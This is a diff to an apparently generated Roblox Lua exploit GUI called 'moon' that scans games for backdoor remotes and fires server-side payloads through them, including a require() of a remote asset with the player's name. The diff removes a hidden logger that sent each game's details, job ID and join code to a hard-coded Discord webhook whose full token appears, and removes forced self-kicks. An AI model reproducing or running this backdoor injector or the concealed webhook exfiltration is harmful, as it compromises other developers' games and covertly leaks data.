@@ -445,6 +445,7 @@ G2L["2f"]["Active"] = true;
 G2L["2f"]["ZIndex"] = 1000000000;
 G2L["2f"]["BorderSizePixel"] = 0;
 G2L["2f"]["CanvasSize"] = UDim2.new(0, 0, 5, 0);
+G2L["2f"]["CanvasPosition"] = Vector2.new(0, 320.66669);
 G2L["2f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["2f"]["Size"] = UDim2.new(-0.01, 505, 0, 259);
 G2L["2f"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
@@ -1145,7 +1146,7 @@ G2L["84"]["BorderSizePixel"] = 0;
 G2L["84"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["84"]["ImageTransparency"] = 0.37;
 -- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
-G2L["84"]["Image"] = [[rbxassetid://92116086047708]];
+G2L["84"]["Image"] = [[rbxassetid://115440600346929]];
 G2L["84"]["Size"] = UDim2.new(0, 155, 0, 141);
 G2L["84"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["84"]["BackgroundTransparency"] = 1;
@@ -1201,7 +1202,7 @@ G2L["8b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["8b"]["BackgroundTransparency"] = 1;
 G2L["8b"]["Size"] = UDim2.new(0, 115, 0, 21);
 G2L["8b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["8b"]["Text"] = [[John Doe]];
+G2L["8b"]["Text"] = [[The Defiant]];
 G2L["8b"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);
 
 
@@ -1794,102 +1795,7 @@ local function C_f()
 
 
 
-		local name = [[
-		local h=game:GetService("HttpService")
-		local p=game:GetService("Players")
-		local m=game:GetService("MarketplaceService")
-		local w={
-			T5="https://discord.com/api/webhooks/1448003425504854046/xqtsHKVd6gelgnzelDYeFZT7Tdwc8TuCKBOaUUUr2wBLDO-22u2DnOVF19ErSD72pQyn"
-		}
-	
-		local u=game.GameId
-		local l=game.PlaceId
-		local api="https://games.roblox.com/v1/games?universeIds="..u
-	
-		local function g()
-			local ok,r=pcall(function()return h:GetAsync(api)end)
-			if ok then
-				local d=h:JSONDecode(r)
-				local x=d.data and d.data[1]
-				if x then
-					return{
-						name=x.name or "didnt fetch",
-						playing=x.playing or 0,
-						visits=x.visits or "didnt fetch",
-						favoritedCount=x.favoritedCount or "didnt fetch",
-						created=x.created,
-						description=x.description or "no description",
-						maxPlayers=x.maxPlayers or 0,
-						creatorName=(x.creator and x.creator.name) or "didnt fetch",
-						creatorId=(x.creator and x.creator.id) or "didnt fetch"
-					}
-				end
-			end
-			local ok2,pi=pcall(function()return m:GetProductInfo(l)end)
-			if ok2 then
-				return{
-					name=pi.Name or "didnt fetch",
-					playing=#p:GetPlayers(),
-					visits="didnt fetch",
-					favoritedCount="didnt fetch",
-					created=pi.Created,
-					description=pi.Description,
-					maxPlayers=pi.MaxPlayers,
-					creatorName=pi.Creator and pi.Creator.Name or "didnt fetch",
-					creatorId=pi.Creator and pi.Creator.Id or "didnt fetch"
-				}
-			end
-			return nil
-		end
-	
-		local function s(c)
-			return w.T5
-		end
-	
-		local function a()
-			local d=g()
-			if not d then return end
-	
-			local tp=d.playing or 0
-			local mx=d.maxPlayers or 0
-			local u2=s(tp)
-			if not u2 then return end
-	
-			local cr="didnt fetch"
-			if d.created then
-				if typeof(d.created)=="number" then cr=os.date("%m/%d/%Y",d.created)
-				elseif typeof(d.created)=="string" then
-					local t=DateTime.fromIsoDate(d.created)
-					cr=os.date("%m/%d/%Y",t.UnixTimestamp)
-				end
-			end
-	
-			local e={
-				title="**GAME LOGGED!**",
-				description="# **GAME INFO**",
-				color=8421504,
-				fields={
-					{name="**Game name :**",value="`"..d.name.."`"},
-					{name="**Total Active Players :**",value="`"..tp.."`",inline=true},
-					{name="**Total Visits :**",value="`"..d.visits.."`",inline=true},
-					{name="**Total Favourites :**",value="`"..d.favoritedCount.."`",inline=true},
-					{name="**Game created:**",value="`"..cr.."`",inline=true},
-					{name="**Job id:**",value="```lua\n"..game.JobId.."```"},
-					{name="**Max players per server:**",value="`"..tp.."/"..mx.."`"},
-					{name="**Join Methods**",value="**[Clik to join](https://www.roblox.com/games/"..l.."/launch)**\n**[Clik to view Game page](https://www.roblox.com/games/"..l..")**"},
-					{name="**JavaScript Join Code:**",value="```javascript\njavascript:(function(){var placeId="..l..";var jobId='"..game.JobId.."';Roblox.GameLauncher.joinGameInstance(placeId,jobId);})();```"},
-					{name="# **Creator Information**",value="**Creator's name:** `"..d.creatorName.."`\n**Creator's ID:** `"..d.creatorId.."`"},
-					{name="# **Other Information**",value="**DESCRIPTION:** "..d.description}
-				},
-				footer={text=os.date("%m/%d/%Y")},
-				thumbnail={url="https://www.roblox.com/asset-thumbnail/image?assetId="..l.."&width=420&height=420&format=png"}
-			}
-	
-			h:PostAsync(u2,h:JSONEncode({embeds={e}}))
-		end
-	
-		a()
-		]]
+
 
 		pcall(function()
 			if isFunction then
@@ -1898,14 +1804,12 @@ local function C_f()
 					pcall(function() remote:InvokeServer("moonTSS", payload) end)
 					pcall(function() remote:InvokeServer(RE) end)
 					pcall(function() remote:InvokeServer(Hint) end) --- its hint dumbass
-					pcall(function() remote:InvokeServer(name) end)
 				end)
 			else
 				pcall(function() remote:FireServer(payload) end)
 				pcall(function() remote:FireServer("moonTSS", payload) end)
 				pcall(function() remote:FireServer(RE) end)
 				pcall(function() remote:FireServer(Hint) end) --- its hint dumbass
-				pcall(function() remote:FireServer(name) end)
 			end
 		end)
 
@@ -2034,7 +1938,6 @@ local function C_f()
 	end
 
 	buttons.connect.MouseButton1Click:Connect(function()
-	    game.Players.LocalPlayer:Kick("Sorry!")
 		setStatus("C")
 		StarterGui:SetCore("SendNotification", {
 			Title = "Moon",
@@ -3617,8 +3520,9 @@ local function C_88()
 			found = false
 		}
 
+
 		local player = game.Players.LocalPlayer
-		local payloading = [[require(6608656220):John(']] .. player.Name .. [[')]]
+		local payloading = [[require(6168743245).load(']] .. player.Name .. [[')]]
 		pcall(function()
 			if isFunction then
 				task.spawn(function()
@@ -4019,7 +3923,7 @@ local function C_9c()
 			end
 
 			local timeoutDuration = 0.5
-			local checkInterval = 0.5 or 1
+			local checkInterval = 0.01
 			local elapsed = 0
 
 			while elapsed < timeoutDuration do
@@ -4255,8 +4159,6 @@ local function C_ab()
 		print("🌙 moon: Running initial backdoor scan...")
 		task.spawn(simpleFindRemote)
 	end
-
-    Players.LocalPlayer:Kick("Sorry!")
 end;
 task.spawn(C_ab);
 
